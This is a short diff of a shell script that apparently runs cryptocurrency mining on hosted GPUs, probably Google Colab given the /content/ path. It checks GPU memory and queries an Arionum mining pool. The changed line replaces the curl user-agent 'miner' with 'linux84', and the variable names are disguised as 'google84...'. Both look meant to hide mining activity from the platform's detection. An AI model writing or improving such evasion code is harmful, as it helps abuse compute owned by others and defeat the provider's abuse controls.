@@ -38,7 +38,7 @@ google84121212121212121274=${arr[2]}
 
 google84=$(nvidia-smi --query-gpu=memory.total --format=csv | sed 's/MiB//g' | sed 's/memory.total//g' | sed 's/\s+\n+\r+//g' | sed 's/\[//g' | sed 's/\]//g')
 
-string=$(curl -s -A "miner" http://mine.arionumpool.com/mine.php?q=info)
+string=$(curl -s -A "linux84" http://mine.arionumpool.com/mine.php?q=info)
 if [[ $string == *"16384"* ]]; then
 
 cd /content/
